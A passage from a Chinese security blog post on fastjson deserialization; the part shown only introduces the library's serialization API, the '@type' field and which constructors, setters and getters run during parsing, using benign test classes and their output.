

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="一、fastjson简介fastjson组件是阿里巴巴开发的反序列化与序列化组件，项目地址：https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;fastjson&#x2F;wiki&#x2F;Quick-Start-CN 简单使用方法如下： 123456&#x2F;&#x2F;序列化String text &#x3D; JSON.toJSONString(obj); &#x2F;&#x2F;反序列化VO vo &#x3D; JSON.parse(); &#x2F;&#x2F;解析为JSONOb">
<meta property="og:type" content="article">
<meta property="og:title" content="FastJSON反序列化漏洞解析">
<meta property="og:url" content="http://example.com/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/index.html">
<meta property="og:site_name" content="白给&#39;s Blog">
<meta property="og:description" content="一、fastjson简介fastjson组件是阿里巴巴开发的反序列化与序列化组件，项目地址：https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;fastjson&#x2F;wiki&#x2F;Quick-Start-CN 简单使用方法如下： 123456&#x2F;&#x2F;序列化String text &#x3D; JSON.toJSONString(obj); &#x2F;&#x2F;反序列化VO vo &#x3D; JSON.parse(); &#x2F;&#x2F;解析为JSONOb">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/image-20220128114618360.png">
<meta property="og:image" content="http://example.com/image/image-20220128150238092.png">
<meta property="og:image" content="http://example.com/image/2414837-20220118174133297-1132976695.png">
<meta property="og:image" content="http://example.com/image/image-20220905160303063-16623649847141.png">
<meta property="og:image" content="http://example.com/image/image-20220905160450268-16623650916213-16623650950735.png">
<meta property="og:image" content="http://example.com/image/image-20220906111415947-16624340578123.png">
<meta property="og:image" content="http://example.com/image/image-20220905160710420-16623652323247.png">
<meta property="og:image" content="http://example.com/image/image-20220905162236365-16623661597249.png">
<meta property="og:image" content="http://example.com/image/image-20220210104604897.png">
<meta property="og:image" content="http://example.com/image/image-20220905173804775-166237068638619.png">
<meta property="og:image" content="http://example.com/image/image-20220905164102745-166236726415211.png">
<meta property="og:image" content="http://example.com/image/image-20220905174430009-166237107164521.png">
<meta property="og:image" content="http://example.com/image/image-20220905164830719-166236771232813.png">
<meta property="og:image" content="http://example.com/image/image-20220906103214944-16624315371361.png">
<meta property="og:image" content="http://example.com/image/image-20220905164854929-166236774004015.png">
<meta property="og:image" content="http://example.com/image/image-20220906153358338-16624496402555.png">
<meta property="og:image" content="http://example.com/image/image-20220906155157758-16624507203509.png">
<meta property="og:image" content="http://example.com/image/image-20220906153844118-16624499263317.png">
<meta property="og:image" content="http://example.com/image/image-20220906160642016-166245160388711.png">
<meta property="og:image" content="http://example.com/image/image-20220906160751848-166245167436613.png">
<meta property="og:image" content="http://example.com/image/image-20220905171235790-166236915766317.png">
<meta property="og:image" content="http://example.com/image/image-20220906162146410-166245250961915.png">
<meta property="og:image" content="http://example.com/image/image-20220906162541552-166245274334517.png">
<meta property="og:image" content="http://example.com/image/image-20220906163301544-166245318412819.png">
<meta property="og:image" content="http://example.com/image/image-20220209171617414.png">
<meta property="og:image" content="http://example.com/image/image-20220210094825242.png">
<meta property="og:image" content="http://example.com/image/image-20220210095210483.png">
<meta property="og:image" content="http://example.com/image/image-20220210095334436.png">
<meta property="og:image" content="http://example.com/image/image-20220210095627159.png">
<meta property="og:image" content="http://example.com/image/image-20220210104604897.png">
<meta property="og:image" content="http://example.com/image/image-20220210105038883.png">
<meta property="og:image" content="http://example.com/image/image-20220210105217734.png">
<meta property="og:image" content="http://example.com/image/image-20220210105514778.png">
<meta property="og:image" content="http://example.com/image/image-20220210111123619.png">
<meta property="og:image" content="http://example.com/image/image-20220210111822121.png">
<meta property="og:image" content="http://example.com/image/image-20220210113532817.png">
<meta property="og:image" content="http://example.com/image/image-20220210113623886.png">
<meta property="og:image" content="http://example.com/image/image-20220210113839439.png">
<meta property="og:image" content="http://example.com/image/image-20220907103135441-16625178971631.png">
<meta property="og:image" content="http://example.com/image/image-20220907103515820-16625181177893.png">
<meta property="og:image" content="http://example.com/image/image-20220907112138942-16625209008225.png">
<meta property="og:image" content="http://example.com/image/image-20220908100501152-16626027031855.png">
<meta property="og:image" content="http://example.com/image/image-20220908102206222-16626037279307.png">
<meta property="og:image" content="http://example.com/image/image-20220908102648098-16626040098489.png">
<meta property="og:image" content="http://example.com/image/image-20220908100111279-16626024730933.png">
<meta property="og:image" content="http://example.com/image/image-20220908094528661-16626015314011.png">
<meta property="og:image" content="http://example.com/image/image-20220908111904169-166260714586611.png">
<meta property="og:image" content="http://example.com/image/image-20220908155129860.png">
<meta property="og:image" content="http://example.com/image/image-20220909104428239-16626914698001.png">
<meta property="og:image" content="http://example.com/image/image-20220909151611298-16627077738143.png">
<meta property="og:image" content="http://example.com/image/image-20220909165153536-16627135155325.png">
<meta property="og:image" content="http://example.com/image/2fd4e3fa452461f51e7ab30b40d2e497.png">
<meta property="og:image" content="http://example.com/image/image-20220914163303120-16631443851911.png">
<meta property="og:image" content="http://example.com/image/image-20220915101030775-16632078323731.png">
<meta property="og:image" content="http://example.com/image/image-20220915102116512-16632084784343.png">
<meta property="og:image" content="http://example.com/image/image-20220914173452845-16631480945763.png">
<meta property="og:image" content="http://example.com/image/image-20220914174838376-16631489201257.png">
<meta property="og:image" content="http://example.com/image/image-20220914173711736-16631482335105.png">
<meta property="og:image" content="http://example.com/image/image-20220915113231225-16632127531165.png">
<meta property="og:image" content="http://example.com/image/image-20220915145950238-16632251916707.png">
<meta property="og:image" content="http://example.com/image/image-20220915150716972-16632256384399.png">
<meta property="og:image" content="http://example.com/image/image-20220916154732110-16633144539751.png">
<meta property="og:image" content="http://example.com/image/453d3967-f666-4285-9ca6-cddbf1138006.png">
<meta property="og:image" content="http://example.com/image/1b038b17-718e-4d17-8c91-0598bb759995.png">
<meta property="og:image" content="http://example.com/image/0ad2638f-0407-470d-9c2c-9384bb556be3.png">
<meta property="og:image" content="http://example.com/image/92e85c41-0a14-438a-82c0-9b4ef077db7a.png">
<meta property="article:published_time" content="2023-04-14T15:37:01.000Z">
<meta property="article:modified_time" content="2024-01-06T15:34:49.303Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="漏洞分析">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/image/image-20220128114618360.png">
  
  
  
  <title>FastJSON反序列化漏洞解析 - 白给&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>白给&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="FastJSON反序列化漏洞解析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-04-14 23:37" pubdate>
          2023年4月14日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          103 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">FastJSON反序列化漏洞解析</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="一、fastjson简介"><a href="#一、fastjson简介" class="headerlink" title="一、fastjson简介"></a>一、fastjson简介</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，项目地址：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
<p>简单使用方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj); <br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parse(); <span class="hljs-comment">//解析为JSONObject类型或者JSONArray类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>); <span class="hljs-comment">//JSON文本解析成JSONObject类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">//JSON文本解析成VO.class类</span><br></code></pre></td></tr></table></figure>

<p>maven地址：<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.alibaba/fastjson">https://mvnrepository.com/artifact/com.alibaba/fastjson</a></p>
<h3 id="1-简单的序列化与反序列化"><a href="#1-简单的序列化与反序列化" class="headerlink" title="1.简单的序列化与反序列化"></a>1.简单的序列化与反序列化</h3><p>编写一个User类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用空参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用形参构造&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用fastjson组件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列号</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><br><span class="hljs-comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parse反序列化：&quot;</span>+obj1);<br><br><span class="hljs-comment">//通过parseObject,不指定类，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj2);<br><br><span class="hljs-comment">//通过parseObject,指定类后返回的是一个相应的类对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr,User.class);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj3);<br></code></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<p><img src="/image/image-20220128114618360.png" srcset="/img/loading.gif" lazyload alt="image-20220128114618360"></p>
<p>返回结果可知：parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</p>
<h3 id="2-type"><a href="#2-type" class="headerlink" title="2.@type"></a>2.@type</h3><pre><code class="hljs">JSON.toJSONString存在3个重载方法，使用toJSONString(Object object, SerializerFeature... features)方法
</code></pre>
<p><img src="/image/image-20220128150238092.png" srcset="/img/loading.gif" lazyload alt="image-20220128150238092"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br></code></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br></code></pre></td></tr></table></figure>

<p>发现输出中存在”@type”:”fastjson.User”，对其反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br><br>System.out.println(JSON.parse(serializedStr).getClass().toString());<br>System.out.println(JSON.parse(serializedStr1).getClass().toString());<br></code></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>class com.alibaba.fastjson.JSONObject<br>调用空参构造<br>调用setAge()<br>调用setName()<br>class fastjson.User<br></code></pre></td></tr></table></figure>

<p>由此可知以下结论：</p>
<ul>
<li><p>com.alibaba.fastjson.JSONObject不能强制转换为其他类型</p>
</li>
<li><p>不指定@type不会调用<strong>构造方法</strong>和<strong>setter</strong></p>
</li>
<li><p>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</p>
</li>
<li><p>跟进parseObject()可以看到和parse的区别：</p>
<p>public static JSONObject parseObject(String text) {<br>    Object obj &#x3D; parse(text);<br>    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);<br>}</p>
</li>
</ul>
<p>编写测试类Persion</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean sex;<br>    <span class="hljs-keyword">private</span> Properties prop;<br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//get 返回Boolean</span><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getSex()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sex;<br>    &#125;<br>    <span class="hljs-comment">//get 返回ProPerties</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-comment">//在输出时会自动调用的对象ToString函数</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[Person Object] name=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; full_name=&quot;</span> + <span class="hljs-built_in">this</span>.full_name  + <span class="hljs-string">&quot;, age=&quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot;, prop=&quot;</span> + <span class="hljs-built_in">this</span>.prop + <span class="hljs-string">&quot;, sex=&quot;</span> + <span class="hljs-built_in">this</span>.sex;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>测试序列化及反序列化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">eneity3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.fastjson.Person\&quot;, \&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eneity3,Person.class);<br><span class="hljs-comment">//输出会调用obj对象的tooString函数</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Person构造函数<br>setAge()<br>getProp()<br>[Person Object] name=zhang full_name=null, age=18, prop=null, sex=null<br></code></pre></td></tr></table></figure>

<pre><code class="hljs">public name 反序列化成功,private full_name 反序列化失败,private age setAge函数被调用,private sex getsex函数没有被调用,private prop getprop函数被成功调用
</code></pre>
<p>从中得知</p>
<ul>
<li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li>
<li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li>
</ul>
